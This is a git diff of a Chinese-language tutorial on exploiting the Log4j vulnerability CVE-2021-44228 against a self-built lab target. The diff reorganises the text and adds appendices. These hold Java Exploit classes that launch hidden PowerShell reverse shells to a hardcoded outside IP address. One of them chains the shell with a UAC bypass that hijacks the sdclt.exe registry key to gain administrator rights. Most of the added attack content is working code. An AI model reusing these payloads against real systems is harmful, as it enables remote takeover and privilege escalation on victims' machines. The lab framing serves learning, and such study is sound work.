@@ -11,7 +11,9 @@ keywords: ['CVE-2021-44228', 'log4j', 'log4j 漏洞']
 
 ## 概述
 
-本文會在本地端 windows 中的 docker 模擬一個含有漏洞的 log4j 環境，並且將攻擊用的 server 放在 gcp 上，最後會利用反向 shell 來使我們可以在 docker 中執行任意指令。
+本文會在本地端 Windows 中的 docker 模擬一個含有漏洞的 log4j 環境，並且將攻擊用的 server 放在 gcp 上，最後回彈一個 shell 給攻擊者。
+
+同時也提供了目標環境在 Windows (無 docker) 下的環境設定，以及如何回彈有 Admin 權限的 shell 的方法。
 
 ## 雲端環境
 
@@ -119,50 +121,6 @@ public class Exploit {
             pb.redirectErrorStream(true);
             Process process = pb.start();
             System.out.println("Reverse shell command executed.");
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
-    }
-}
-```
-
-上面的 `Exploit.java` 使用 bash 的原因是因為我們的受害者電腦是在 docker 環境下，因此我們選擇使用 bash，如果我們的目標電腦是 windows 的話，我們可以改為使用 powershell :
-
-```java title="Exploit.java" showLineNumbers {6-7}
-import java.io.IOException;
-
-public class Exploit {
-    static {
-        try {
-            String host = "104.199.254.153";
-            int port = 8000;
-            String payload = String.format(
-                "$client = New-Object System.Net.Sockets.TCPClient('%s',%d);" +
-                "$stream = $client.GetStream();" +
-                "$writer = New-Object System.IO.StreamWriter($stream);" +
-                "$reader = New-Object System.IO.StreamReader($stream);" +
-                "$writer.AutoFlush = $true;" +
-                "while($true) {" +
-                    "$command = $reader.ReadLine();" +
-                    "if ($command -eq 'exit') { break }" +
-                    "$output = try { Invoke-Expression $command 2>&1 | Out-String } catch { $_.Exception.Message }" +
-                    "$writer.WriteLine($output)" +
-                "}" +
-                "$client.Close()",
-                host, port
-            );
-
-            String[] command = {
-                "powershell.exe",
-                "-NoProfile",
-                "-ExecutionPolicy", "Bypass",
-                "-Command", payload
-            };
-
-            ProcessBuilder pb = new ProcessBuilder(command);
-            pb.redirectErrorStream(true);
-            Process process = pb.start();
-            System.out.println("PowerShell reverse shell command executed.");
         } catch (IOException e) {
             e.printStackTrace();
         }
@@ -345,30 +303,13 @@ docker build -t vulnerable-app .
 docker run -p 8080:8080 vulnerable-app
 ```
 
-由於我們前面要求回傳的 shell 是 bash，但在這個 container 中並沒有 bash，
-因此我們需要在 container 中安裝 bash :
+由於我們前面要求回傳的 shell 是 bash，但在這個 container 中並沒有 bash，因此我們需要在 container 中安裝 bash :
 
 ```bash
 apk add --no-cache bash
 ```
 
 接著輸入 `which bash` 來確認是否安裝成功。
-
-如果我們不想使用 docker 來建立環境，我們也可以直接在本地端依據以下步驟來建立環境 :
-
-1. 首先到 [這個網站](https://www.openlogic.com/openjdk-downloads?field_java_parent_version_target_id=416&field_operating_system_target_id=436&field_architecture_target_id=391&field_java_package_target_id=396) 安裝 java-8
-2. 接著安裝 [log4j-core-2.14.1.jar](https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-core/2.14.1/log4j-core-2.14.1.jar) 和 [log4j-api-2.14.1.jar](https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-api/2.14.1/log4j-api-2.14.1.jar)
-3. 在 powershell 中執行以下指令
-
-```pwsh
-javac -cp "log4j-core-2.14.1.jar;log4j-api-2.14.1.jar" VulnerableApp.java
-```
-
-```pwsh
-java -cp ".;log4j-core-2.14.1.jar;log4j-api-2.14.1.jar" VulnerableApp
-```
-
-要注意在 windows 中沒有 bash，因此在 `Exploit.java` 中的指令要改為 powershell。
 
 ## 測試
 
@@ -394,6 +335,141 @@ RawContentLength  : 17
 ```
 
 接著我們應該也可以在 reverse shell 中看到 bash 成功跳出，代表這次的攻擊成功。
+
+## Appendix 1 : 將 Docker 改成 Windows 環境
+
+前面的 `Exploit.java` 使用 bash 的原因是因為我們的受害者電腦是在 docker 環境下，如果我們的目標電腦是 Windows 的話，我們可以改為使用 powershell :
+
+```java title="Exploit.java" showLineNumbers {6-7}
+import java.io.IOException;
+
+public class Exploit {
+    static {
+        try {
+            String host = "104.199.254.153";
+            int port = 8000;
+            String payload = String.format(
+                "$client = New-Object System.Net.Sockets.TCPClient('%s',%d);" +
+                "$stream = $client.GetStream();" +
+                "$writer = New-Object System.IO.StreamWriter($stream);" +
+                "$reader = New-Object System.IO.StreamReader($stream);" +
+                "$writer.AutoFlush = $true;" +
+                "while($true) {" +
+                    "$command = $reader.ReadLine();" +
+                    "if ($command -eq 'exit') { break }" +
+                    "$output = try { Invoke-Expression $command 2>&1 | Out-String } catch { $_.Exception.Message }" +
+                    "$writer.WriteLine($output)" +
+                "}" +
+                "$client.Close()",
+                host, port
+            );
+
+            String[] command = {
+                "powershell.exe",
+                "-NoProfile",
+                "-ExecutionPolicy", "Bypass",
+                "-Command", payload
+            };
+
+            ProcessBuilder pb = new ProcessBuilder(command);
+            pb.redirectErrorStream(true);
+            Process process = pb.start();
+            System.out.println("PowerShell reverse shell command executed.");
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+}
+```
+
+要在 Windows 中建立環境，我們可以依據以下步驟來建立環境 :
+
+1. 首先到 [這個網站](https://www.openlogic.com/openjdk-downloads?field_java_parent_version_target_id=416&field_operating_system_target_id=436&field_architecture_target_id=391&field_java_package_target_id=396) 安裝 java-8
+2. 接著安裝 [log4j-core-2.14.1.jar](https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-core/2.14.1/log4j-core-2.14.1.jar) 和 [log4j-api-2.14.1.jar](https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-api/2.14.1/log4j-api-2.14.1.jar)
+3. 在 powershell 中執行以下指令
+
+```pwsh
+javac -cp "log4j-core-2.14.1.jar;log4j-api-2.14.1.jar" VulnerableApp.java
+```
+
+```pwsh
+java -cp ".;log4j-core-2.14.1.jar;log4j-api-2.14.1.jar" VulnerableApp
+```
+
+## Appendix 2 : 回彈有 Admin 權限的 shell
+
+可以使用 UAC bypass 的方式來取得 Admin 權限，以下是一個簡單的範例 :
+
+```java title="Exploit.java"
+import java.io.FileWriter;
+import java.io.IOException;
+
+public class Exploit {
+    static {
+        try {
+            String host = "104.199.254.153";
+            int port = 8000;
+
+            // PowerShell payload as a string
+            String payload = String.format(
+                "$client = New-Object System.Net.Sockets.TCPClient('%s', %d);" +
+                "$stream = $client.GetStream();" +
+                "$writer = New-Object System.IO.StreamWriter($stream);" +
+                "$reader = New-Object System.IO.StreamReader($stream);" +
+                "$writer.AutoFlush = $true;" +
+                "while ($true) {" +
+                    "$command = $reader.ReadLine();" +
+                    "if ($command -eq 'exit') { break }" +
+                    "$output = try { Invoke-Expression $command 2>&1 | Out-String } catch { $_.Exception.Message };" +
+                    "$writer.WriteLine($output);" +
+                "}" +
+                "$client.Close();", host, port);
+
+            // Write the payload to a .ps1 file
+            String ps1FilePath = System.getProperty("user.home") + "\\reverse_shell.ps1";
+            try (FileWriter fileWriter = new FileWriter(ps1FilePath)) {
+                fileWriter.write(payload);
+            }
+
+            // Define the UAC bypass function
+            String uacBypassCommand = String.format(
+                "function uacbypass { " +
+                    "param($ps1Path) " +
+                    "New-Item -Force -Path 'HKCU:\\Software\\Classes\\Folder\\shell\\open\\command' -Value ('powershell -ExecutionPolicy Bypass -WindowStyle hidden -File \"' + $ps1Path + '\"'); " +
+                    "New-ItemProperty -Force -Path 'HKCU:\\Software\\Classes\\Folder\\shell\\open\\command' -Name 'DelegateExecute'; " +
+                    "Start-Process -FilePath $env:windir\\system32\\sdclt.exe; " +
+                    "Start-Sleep -s 2; " +
+                    "Remove-Item -Path 'HKCU:\\Software\\Classes\\Folder' -Recurse;" +
+                "}; " +
+                // Call uacbypass to execute the .ps1 script
+                "uacbypass '%s';", ps1FilePath
+            );
+
+            // Run the UAC bypass PowerShell command
+            String[] command = {
+                "cmd.exe", "/c", "start", "/min", "powershell.exe",
+                "-NoProfile",
+                "-WindowStyle", "hidden",
+                "-ExecutionPolicy", "Bypass",
+                "-Command", uacBypassCommand
+            };
+
+            ProcessBuilder pb = new ProcessBuilder(command);
+            pb.redirectErrorStream(true);
+            Process process = pb.start();
+            System.out.println("PowerShell reverse shell and UAC bypass executed.");
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+}
+```
+
+可以使用以下的指令來確定是否有成功取得 Admin 權限 :
+
+```pwsh
+[bool]([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+```
 
 ## 參考
 
